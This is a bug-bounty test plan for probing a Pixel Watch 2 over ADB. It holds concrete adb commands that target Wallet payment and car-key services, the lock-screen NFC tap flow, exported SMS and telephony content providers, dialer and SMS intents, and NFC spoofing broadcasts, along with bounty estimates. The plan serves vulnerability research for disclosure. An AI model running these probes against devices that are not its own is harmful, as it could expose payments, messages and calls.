# Dynamic Test Plan — Wear OS Vulnerability Validation

> **Status:** READY TO EXECUTE (when device connected)
> **Device:** Pixel Watch 2 (via ADB over WiFi)
> **Last Updated:** 2026-06-30
> **Priority:** Execute tests in order (highest bounty potential first)

---

## Pre-Test Setup

```bash
# Connect to watch
adb connect <WATCH_IP>:<PORT>
adb devices

# Record device info for VRP report
adb shell getprop ro.build.display.id
adb shell getprop ro.build.version.security_patch
adb shell getprop ro.product.model

# Start logcat capture (run in background terminal)
adb logcat -v time > ~/vulntest_$(date +%Y%m%d_%H%M%S).log &
LOGCAT_PID=$!
```

---

## TEST 1: Wallet WearPayService — Payment Service Access (CRITICAL)

### Objective
Verify if unprivileged apps can bind to WearPayService and trigger payment operations.

### Commands

```bash
# Test 1a: Direct service start (should fail with SecurityException if protected)
adb shell am startservice \
  -a "com.google.android.gms.tapandpay.wear.WearPayService.v2" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.service.WearPayService"

# Test 1b: Bind attempt via am command
adb shell am start-service \
  --user 0 \
  -a "com.google.android.gms.tapandpay.wear.WearPayService.v2" \
  "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.service.WearPayService"

# Test 1c: Check if service is accessible via dumpsys
adb shell dumpsys activity services | grep -A 5 "WearPayService"

# Test 1d: Check the actual permission enforcement
adb shell dumpsys package com.google.android.apps.walletnfcrel | grep -A 3 "WearPayService"
```

### Expected Results
- **If VULNERABLE:** Service starts without SecurityException → CRITICAL finding ($5K-$15K)
- **If SECURE:** SecurityException thrown with "Permission Denial" → Service is runtime-protected

### Evidence Capture
```bash
adb logcat -d | grep -i "WearPay\|tapandpay\|SecurityException\|Permission" > ~/wallet_test1.log
```

---

## TEST 2: Wallet TapActivity — Lock Screen NFC Payment Bypass (CRITICAL)

### Objective
Verify if NFC payment tap flow can be triggered from lock screen by external app.

### Commands

```bash
# Lock the watch first
adb shell input keyevent KEYCODE_POWER
sleep 2

# Test 2a: Launch TapActivity while locked (showWhenLocked=true in manifest)
adb shell am start \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.tap.TapActivity" \
  --activity-brought-to-front

# Test 2b: Try with explicit intent
adb shell am start \
  -a "android.intent.action.MAIN" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.tap.TapActivity"

# Test 2c: Try task hijacking via singleTask
adb shell am start \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.tap.TapActivity" \
  --activity-clear-task \
  --activity-new-task

# Unlock and check what happened
adb shell input keyevent KEYCODE_POWER
```

### Expected Results
- **If VULNERABLE:** Payment tap UI appears on locked device → HIGH severity ($3K-$7.5K)
- **If SECURE:** Activity is blocked from launching while locked

### Evidence Capture
```bash
adb logcat -d | grep -i "TapActivity\|showWhenLocked\|keyguard" > ~/wallet_test2.log
adb shell screencap /sdcard/wallet_tap_test.png && adb pull /sdcard/wallet_tap_test.png ~/
```

---

## TEST 3: Wallet KeyguardUnlockActivity — Digital Car Key Bypass (HIGH)

### Objective
Test if digital car key keyguard unlock can be triggered externally.

### Commands

```bash
# Test 3a: Direct launch
adb shell am start \
  -a "KEYGUARD_UNLOCK" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.dck.keyguard.KeyguardUnlockActivity"

# Test 3b: With explicit action
adb shell am start \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.dck.keyguard.KeyguardUnlockActivity" \
  -a "com.google.commerce.tapandpay.wear.dck.keyguard.KEYGUARD_UNLOCK"

# Test 3c: Check Digital Car Key state
adb shell dumpsys activity activities | grep -i "dck\|keyguard\|car.key"
```

### Evidence Capture
```bash
adb logcat -d | grep -i "dck\|KeyguardUnlock\|car.key" > ~/wallet_test3.log
```

---

## TEST 4: Cross-Device Proximity Bypass — Precondition Check Design Flaw (HIGH)

### Objective
Verify the ProximityWearableListenerService precondition bypass where checkDeviceLock/checkDeviceSecure booleans are attacker-controlled.

### Commands

```bash
# Test 4a: Start ProximityWearableListenerService
adb shell am startservice \
  -a "com.google.android.gms.wearable.REQUEST_RECEIVED" \
  -n "com.google.android.crossdeviceaccessservice/com.google.android.crossdeviceaccessservice.associated.proximityprovider.service.ProximityWearableListenerService"

# Test 4b: Check if service started
adb shell dumpsys activity services | grep -A 10 "ProximityWearableListenerService"

# Test 4c: Test SharedWearableListenerService
adb shell am startservice \
  -a "com.google.android.gms.wearable.MESSAGE_RECEIVED" \
  -n "com.google.android.crossdeviceaccessservice/com.google.android.crossdeviceaccessservice.associated.shared.communication.wear.SharedWearableListenerService"

# Test 4d: Verify DebugBroadcastReceiver is truly no-op
adb shell am broadcast \
  -a "com.google.android.crossdeviceaccessservice.intent.action.ACTION_DEBUG_ANY_WATCH_NEARBY" \
  -n "com.google.android.crossdeviceaccessservice/com.google.android.crossdeviceaccessservice.common.intent.DebugBroadcastReceiver"

# Test 4e: Test SensorEventReceiver for injection
adb shell am broadcast \
  -a "com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_SENSOR_EVENT" \
  -n "com.google.android.crossdeviceaccessservice/com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.SensorEventReceiver" \
  --es "crossdeviceaccessservice.sensor_event_data" "AAAA"

# Test 4f: Test KeyguardEventReceiver
adb shell am broadcast \
  -a "com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_KEYGUARD_STATE_CHANGED_EVENT" \
  -n "com.google.android.crossdeviceaccessservice/com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.KeyguardEventReceiver" \
  --es "crossdeviceaccessservice.keyguard_event_data" "AAAA"

# Check if CrossDeviceUnlock is enabled in THIS build
adb shell dumpsys activity services | grep -i "crossdeviceunlock\|proximity"
adb logcat -d | grep -i "CrossDeviceUnlock\|not enabled\|proximity"
```

### Expected Results
- **If VULNERABLE:** Services start, receivers accept broadcasts without errors → Design flaw confirmed
- **Key Evidence:** Log showing "CrossDeviceUnlock is not enabled" confirms feature disabled but infrastructure exposed

### Evidence Capture
```bash
adb logcat -d | grep -i "crossdevice\|proximity\|precondition\|sensor\|keyguard" > ~/crossdevice_test.log
```

---

## TEST 5: Wear Services GcoreWearableListenerService — Data Layer Injection (CRITICAL)

### Objective
Verify that the core Wear Services Data Layer listener can be invoked without permissions and processes arbitrary paths.

### Commands

```bash
# Test 5a: Start the service directly
adb shell am startservice \
  -a "com.google.android.gms.wearable.DATA_CHANGED" \
  -n "com.google.wear.services/com.google.wear.services.infra.gcore.service.GcoreWearableListenerService" \
  -d "wear://*/call"

# Test 5b: Test MESSAGE_RECEIVED path
adb shell am startservice \
  -a "com.google.android.gms.wearable.MESSAGE_RECEIVED" \
  -n "com.google.wear.services/com.google.wear.services.infra.gcore.service.GcoreWearableListenerService" \
  -d "wear://*/wifi"

# Test 5c: Test lock_screen path
adb shell am startservice \
  -a "com.google.android.gms.wearable.DATA_CHANGED" \
  -n "com.google.wear.services/com.google.wear.services.infra.gcore.service.GcoreWearableListenerService" \
  -d "wear://*/lock_screen"

# Test 5d: Test remote_intent path (DANGEROUS - could execute intents)
adb shell am startservice \
  -a "com.google.android.gms.wearable.MESSAGE_RECEIVED" \
  -n "com.google.wear.services/com.google.wear.services.infra.gcore.service.GcoreWearableListenerService" \
  -d "wear://*/remote_intent"

# Test 5e: Check service status
adb shell dumpsys activity services | grep -A 15 "GcoreWearableListenerService"

# Test 5f: Verify path prefixes registered
adb shell dumpsys package com.google.wear.services | grep -A 20 "wear-home-app-path-prefixes"
```

### Expected Results
- **If VULNERABLE:** Service starts for all paths without permission check → CRITICAL ($5K-$15K)
- **If SECURE:** SecurityException or path validation rejects unrecognized sources

### Evidence Capture
```bash
adb logcat -d | grep -i "GcoreWearable\|DispatchingGms\|WearableLS\|wifi\|lock_screen\|remote_intent" > ~/wearservices_test.log
```

---

## TEST 6: Exported Content Providers — Data Leakage (HIGH)

### Objective
Query exported content providers without permissions to read sensitive data.

### Commands

```bash
# Test 6a: BugleContentProvider (Messages) — read SMS database
adb shell content query \
  --uri "content://com.google.android.apps.messaging.shared.datamodel.BugleContentProvider/conversations"

adb shell content query \
  --uri "content://com.google.android.apps.messaging.shared.datamodel.BugleContentProvider/messages"

# Test 6b: WatchFaceInstancesContentProvider — read watchface data
adb shell content query \
  --uri "content://com.google.wear.services.watchface.provider/instances"

adb shell content query \
  --uri "content://com.google.wear.services.watchface.provider"

# Test 6c: TelephonyProvider — read telephony data
adb shell content query \
  --uri "content://telephony/carriers"

adb shell content query \
  --uri "content://telephony/siminfo"

# Test 6d: CarrierIdProvider
adb shell content query \
  --uri "content://carrier_id/all"

# Test 6e: SharedStorageProvider (Messages)
adb shell content query \
  --uri "content://com.google.android.apps.messaging.shared.datamodel.provider.sharedstorage.SharedStorageProvider"

# Test 6f: Try SQL injection on TelephonyProvider
adb shell content query \
  --uri "content://telephony/carriers" \
  --where "1=1"
```

### Expected Results
- **If VULNERABLE:** Data returned without permission error → HIGH severity data leak ($3K-$7.5K)
- **If SECURE:** Permission denied or SecurityException

### Evidence Capture
```bash
# Save all outputs
for test in "conversations" "messages" "instances" "carriers" "siminfo"; do
  echo "=== $test ===" >> ~/provider_test.log
  adb shell content query --uri "content://com.google.android.apps.messaging.shared.datamodel.BugleContentProvider/$test" >> ~/provider_test.log 2>&1
done
```

---

## TEST 7: Wallet Deep Link / Task Hijacking (HIGH)

### Objective
Verify task hijacking via singleTask exported activities with deep links.

### Commands

```bash
# Test 7a: Launch WalletThemedWearCardListActivity via deep link
adb shell am start \
  -a "android.intent.action.VIEW" \
  -d "https://www.android.com/payapp" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.cardlist.WalletThemedWearCardListActivity"

# Test 7b: Test with different deep link paths
adb shell am start \
  -a "android.intent.action.VIEW" \
  -d "https://www.android.com/payapp/cards"

# Test 7c: Verify task stack manipulation
adb shell am start \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.cardlist.WalletThemedWearCardListActivity" \
  --activity-clear-task \
  --activity-new-task

# Check task stacks
adb shell dumpsys activity activities | grep -B 5 -A 10 "walletnfcrel"
```

### Evidence Capture
```bash
adb logcat -d | grep -i "WalletThemed\|payapp\|cardlist\|TaskRecord" > ~/wallet_deeplink_test.log
adb shell screencap /sdcard/wallet_deeplink.png && adb pull /sdcard/wallet_deeplink.png ~/
```

---

## TEST 8: Assistant ProactiveWearableListenerService — Data Layer Injection (HIGH)

### Objective
Confirm the already-identified Assistant vulnerability is still present and exploitable.

### Commands

```bash
# Test 8a: Start the proactive service
adb shell am startservice \
  -a "com.google.android.gms.wearable.DATA_CHANGED" \
  -n "com.google.android.wearable.assistant/com.google.android.libraries.assistant.pcp.wearabledatalayer.ProactiveWearableListenerService" \
  -d "wear://*/assistant/proactive"

# Test 8b: Check if service started and is accepting data
adb shell dumpsys activity services | grep -A 10 "ProactiveWearableListenerService"

# Test 8c: Test AssistantService (microphone service)
adb shell am startservice \
  -a "com.google.android.ssb.action.SSB_SERVICE" \
  -n "com.google.android.wearable.assistant/com.google.android.wearable.libraries.assistantclientlib.AssistantService"

# Test 8d: Verify service permissions via dumpsys
adb shell dumpsys package com.google.android.wearable.assistant | grep -A 3 "ProactiveWearableListenerService\|AssistantService"
```

### Expected Results
- **If VULNERABLE:** Service starts → HIGH severity ($3K-$7.5K)
- Already confirmed in previous research session — re-validate

### Evidence Capture
```bash
adb logcat -d | grep -i "ProactiveWearable\|AssistantService\|SSB_SERVICE" > ~/assistant_test.log
```

---

## TEST 9: Dialer WearableListenerService — Call/SMS Abuse (HIGH)

### Objective
Verify Dialer's Data Layer service can be accessed and potentially trigger calls.

### Commands

```bash
# Test 9a: Start Dialer's wearable listener
adb shell am startservice \
  -a "com.google.android.gms.wearable.MESSAGE_RECEIVED" \
  -n "com.google.android.dialer/com.google.android.dialershared.wearabledatalayer.messageclient.service.DialerWearableListenerService" \
  -d "wear://*/dialer"

# Test 9b: Try REQUEST_RECEIVED path
adb shell am startservice \
  -a "com.google.android.gms.wearable.REQUEST_RECEIVED" \
  -n "com.google.android.dialer/com.google.android.dialershared.wearabledatalayer.messageclient.service.DialerWearableListenerService"

# Test 9c: Test the HomeScreenActivity with tel: URI (potential silent call)
adb shell am start \
  -a "android.intent.action.DIAL" \
  -d "tel:+1234567890" \
  -n "com.google.android.dialer/com.google.android.wearable.googledialer.homescreen.impl.ui.HomeScreenActivity"

# Test 9d: Test direct call via VIEW intent
adb shell am start \
  -a "android.intent.action.VIEW" \
  -d "tel:+1234567890" \
  -n "com.google.android.dialer/com.google.android.wearable.googledialer.homescreen.impl.ui.HomeScreenActivity"

# Test 9e: Inject fake missed call notification
adb shell am broadcast \
  -a "android.telecom.action.SHOW_MISSED_CALLS_NOTIFICATION" \
  -n "com.google.android.dialer/com.google.android.wearable.googledialer.notification.missedcallreceiver.MissedCallNotificationReceiver_Receiver" \
  --ei "android.telecom.extra.NOTIFICATION_COUNT" 5 \
  --es "android.telecom.extra.NOTIFICATION_PHONE_NUMBER" "+1900PREMIUM"
```

### Evidence Capture
```bash
adb logcat -d | grep -i "DialerWearable\|HomeScreen\|DIAL\|CALL\|missed" > ~/dialer_test.log
```

---

## TEST 10: Messages Voice SMS Confirmation Bypass (MEDIUM-HIGH)

### Objective
Confirm whether the voice SMS path (SendToProxyActivityWithPrivilege) can be exploited.

### Commands

```bash
# Test 10a: Direct launch of privileged SMS activity
adb shell am start \
  -a "com.google.android.apps.messaging.action.SEND_MESSAGE" \
  -d "smsto:6385436230" \
  -n "com.google.android.apps.messaging/com.google.android.apps.messaging.send.SendToProxyActivityWithPrivilege" \
  --es "sms_body" "Security test message" \
  -f 0x10008000

# Test 10b: Try without explicit component (let intent resolution handle it)
adb shell am start \
  -a "com.google.android.apps.messaging.action.SEND_MESSAGE" \
  -d "smsto:6385436230" \
  --es "sms_body" "Test"

# Test 10c: Standard SENDTO path for comparison
adb shell am start \
  -a "android.intent.action.SENDTO" \
  -d "smsto:6385436230" \
  -n "com.google.android.apps.messaging/com.google.android.apps.messaging.send.SendToProxyActivity" \
  --es "sms_body" "Test"

# Test 10d: Monitor what happens (was SMS sent? confirmation shown?)
adb logcat -d | grep -i "SendToProxy\|SendMessage\|sms\|confirmation" | tail -30
```

### Critical Observation
Watch the device during Test 10a — if SMS sends with NO confirmation dialog, this is a confirmed vulnerability worth $1K-$3K.

### Evidence Capture
```bash
adb logcat -d | grep -i "SendToProxy\|Privilege\|SendMessage\|SmsManager" > ~/sms_voice_test.log
# Take screenshot to prove whether confirmation appeared
adb shell screencap /sdcard/sms_test.png && adb pull /sdcard/sms_test.png ~/
```

---

## TEST 11: NFC Field Spoofing — Wallet Payment Trigger (MEDIUM)

### Objective
Test if spoofing NFC field detection triggers payment preparation.

### Commands

```bash
# Test 11a: Send RF_FIELD_ON_DETECTED broadcast
adb shell am broadcast \
  -a "com.android.nfc_extras.action.RF_FIELD_ON_DETECTED" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.secureelementpayment.NfcFieldBroadcastReceiver"

# Test 11b: Try the EnableWearWallet receiver
adb shell am broadcast \
  -a "ENABLE_WEAR_WALLET_APP" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.cardlist.EnableWearWalletReceiver"

# Test 11c: Trigger retail mode
adb shell am broadcast \
  -a "STARTED_RETAIL_DREAM" \
  -n "com.google.android.apps.walletnfcrel/com.google.commerce.tapandpay.wear.retail.RetailBroadcastReceiver"
```

### Evidence Capture
```bash
adb logcat -d | grep -i "NfcField\|RF_FIELD\|retail\|EnableWearWallet\|payment" > ~/nfc_spoof_test.log
```

---

## Post-Test Cleanup

```bash
# Stop logcat capture
kill $LOGCAT_PID

# Collect all evidence
mkdir -p ~/wear_vuln_evidence_$(date +%Y%m%d)
cp ~/wallet_test*.log ~/crossdevice_test.log ~/wearservices_test.log \
   ~/provider_test.log ~/assistant_test.log ~/dialer_test.log \
   ~/sms_voice_test.log ~/nfc_spoof_test.log \
   ~/wear_vuln_evidence_$(date +%Y%m%d)/

# Pull any screenshots
adb pull /sdcard/ ~/wear_vuln_evidence_$(date +%Y%m%d)/screenshots/

# Final device state capture
adb shell dumpsys activity services > ~/wear_vuln_evidence_$(date +%Y%m%d)/services_dump.txt
adb shell dumpsys package > ~/wear_vuln_evidence_$(date +%Y%m%d)/package_dump.txt

echo "All evidence collected in ~/wear_vuln_evidence_$(date +%Y%m%d)/"
```

---

## Quick Decision Matrix

After running tests, classify results:

| Test Result | Action |
|-------------|--------|
| Service starts without SecurityException | → CONFIRMED VULN, proceed to VRP report |
| Content provider returns data | → CONFIRMED DATA LEAK, immediate VRP |
| Activity launches while locked | → CONFIRMED LOCKSCREEN BYPASS, immediate VRP |
| Confirmation dialog appears | → MITIGATED, note as MEDIUM/LOW |
| Permission Denial error | → NOT VULNERABLE for that specific path |
| Crash/null pointer | → Potential DoS bug, note separately |

---

## Bounty Estimation

| Finding | If Confirmed | Estimated Bounty |
|---------|-------------|-----------------|
| Wallet payment service access | CRITICAL | $7,500-$15,000 |
| Cross-device precondition bypass | HIGH | $5,000-$10,000 |
| Wear Services Data Layer injection | HIGH-CRITICAL | $5,000-$15,000 |
| Content provider data leaks | HIGH | $3,000-$7,500 |
| SMS voice path bypass | MEDIUM-HIGH | $1,000-$3,000 |
| Lockscreen payment bypass | HIGH | $3,000-$7,500 |
| Digital Car Key unlock bypass | HIGH | $3,000-$7,500 |

**Total Potential: $28,500-$75,000+** (if all confirmed)
